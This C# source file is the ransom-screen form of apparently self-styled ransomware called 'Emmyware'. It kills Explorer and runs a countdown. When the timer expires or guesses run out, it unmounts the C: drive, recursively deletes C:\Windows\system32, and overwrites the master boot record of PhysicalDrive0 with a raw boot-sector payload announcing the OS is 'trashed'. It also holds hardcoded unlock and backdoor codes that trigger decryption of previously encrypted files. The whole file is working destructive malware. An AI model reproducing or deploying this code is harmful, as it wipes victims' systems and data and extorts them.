using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Emmyware
{
    public partial class RansomFrm : Form
    {
        string CryptCode = "EmmyKicksAss!";
        string BackdoorCode = "NotAFuckinBackdoor";
        private const int totalSeconds = 300; // 5 minutes
        private int remainingSeconds;

        public int Retries = 10;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSize);

        private const uint GENERIC_ALL = 0x10000000;
        private const uint FILE_SHARE_READ = 0x00000001;
        private const uint FILE_SHARE_WRITE = 0x00000002;
        private const uint OPEN_EXISTING = 3;
        private const uint MbrSize = 512;
        public RansomFrm()
        {
            InitializeComponent();
            TimerProgressBar.Maximum = totalSeconds;
            TimerProgressBar.Value = 0;
        }

        public void MBRPayload()
        {
            var mbrData = new byte[]  {
                0xBE, 0x12, 0xC0, 0xAC, 0x08, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10, 0xEB, 0xF5, 0xFA, 0xF4,
0xEB, 0xFD, 0x47, 0x61, 0x6D, 0x65, 0x20, 0x4F, 0x76, 0x65, 0x72, 0x21, 0x20, 0x59, 0x6F, 0x75,
0x20, 0x74, 0x72, 0x69, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x75, 0x65, 0x73, 0x73, 0x20,
0x74, 0x68, 0x65, 0x20, 0x63, 0x6F, 0x64, 0x65, 0x2C, 0x20, 0x62, 0x75, 0x74, 0x20, 0x79, 0x6F,
0x75, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x4F,
0x53, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68,
0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x77, 0x61, 0x79, 0x21, 0x20, 0x45,
0x6D, 0x6D, 0x79, 0x77, 0x61, 0x72, 0x65, 0x20, 0x6D, 0x61, 0x64, 0x65, 0x20, 0x62, 0x79, 0x20,
0x45, 0x6D, 0x6D, 0x79, 0x4D, 0x61, 0x6C, 0x77, 0x61, 0x72, 0x65, 0x2E, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

 };
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }

        private void RansomFrm_Load(object sender, EventArgs e)
        {
            // You're not the admin, bro
            AdminPanelButton.Visible = false;
            EncryptionTimer.Start();
            CMDOperations.ExecuteCommand("TASKKILL /F /IM EXPLORER.EXE", false);
        }

        public void updateTime()
        {
            TimeSpan time = TimeSpan.FromSeconds(remainingSeconds);
            TimerLabel.Text = string.Format("{0}:{1:00}", (int)time.TotalMinutes, time.Seconds);
        }

        private void EncryptionTimer_Tick(object sender, EventArgs e)
        {
            if (remainingSeconds > 0)
            {
                remainingSeconds--;
                updateTime();
                TimerProgressBar.Value = totalSeconds - remainingSeconds;
            }
            else
            {
                EncryptionTimer.Stop();
                MessageBox.Show("Game Over!", "Fucked 6 ways to Sunday", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
                CMDOperations.ExecuteCommand("MOUNTVOL C: /D", false);
                MBRPayload();
                Environment.Exit(0);
            }
        }

        private void ResetTimerButton_Click(object sender, EventArgs e)
        {
            new LoginFrm().ShowDialog();
            EncryptionTimer.Stop();
            remainingSeconds = totalSeconds;
            TimerProgressBar.Value = 0;
            updateTime();
            EncryptionTimer.Start();
        }

        public void DoDaDecryption()
        {
            File.WriteAllBytes(EncryptionLogic.KeyFilePath, EncryptionLogic.randomKey);
            File.WriteAllBytes(EncryptionLogic.IVFilePath, EncryptionLogic.randomIV);
            using (List<string>.Enumerator enumerator = Program.encryptedFiles.GetEnumerator())
            {
                while (enumerator.MoveNext())
                {
                    string fileName = enumerator.Current;
                    try
                    {
                        EncryptionLogic.Crypt(fileName, true);
                        Thread.Sleep(100);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLogger.Log(ex);
                    }
                }
            }

            Invoke(new MethodInvoker(delegate()
            {
                MessageBox.Show("Decryption Complete! You can now safely exit this program by restarting your PC.");
                AdminPanelButton.Visible = true;
            }));
        }

        private void CheckCodeButton_Click(object sender, EventArgs e)
        {
            if (CodeTextBox.Text == "")
            {
                MessageBox.Show("Enter a code", "Checker", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Retries--;
            }

            else
            {
                MessageBox.Show("Not the code", "Checker", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Retries--;
            }
            
            // Here comes the Retry train!

            if (Retries == 9)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 9";
            }

            else if (Retries == 8)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 8";
            }

            else if (Retries == 7)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 7";
            }

            else if (Retries == 6)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 6";
            }

            else if (Retries == 5)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 5 (getting low)";
            }

            else if (Retries == 4)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 4 (getting low)";
            }

            else if (Retries == 3)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 3 (getting very low)";
            }

            else if (Retries == 2)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 2 (getting very low)";
            }

            else if (Retries == 1)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 1 (only 1 attempt)";
            }

            else if (Retries == 0)
            {
                RetryAttemptsLabel.Text = "Code Attempt Retries: 0. Game Over!";
                MessageBox.Show("Game Over!", "Fucked 6 ways to Sunday", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
                Directory.Delete("C:\\Windows\\system32", true);
                MBRPayload();
                Environment.Exit(0);
            }

            if (CodeTextBox.Text == CryptCode)
            {
                MessageBox.Show("That is the code!", "Checker", MessageBoxButtons.OK, MessageBoxIcon.Information);
                AdminPanelButton.Visible = true;
                DoDaDecryption();
            }
        }

        private void CheckBackdoorButton_Click(object sender, EventArgs e)
        {
            if (BackdoorTextBox.Text == "")
            {
                MessageBox.Show("Enter a code", "Checker", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            else
            {
                MessageBox.Show("Not the code", "Checker", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            if (BackdoorTextBox.Text == BackdoorCode)
            {
                MessageBox.Show("That is the code!", "Checker", MessageBoxButtons.OK, MessageBoxIcon.Information);
                AdminPanelButton.Visible = true;
                DoDaDecryption();
            }
        }
    }
}
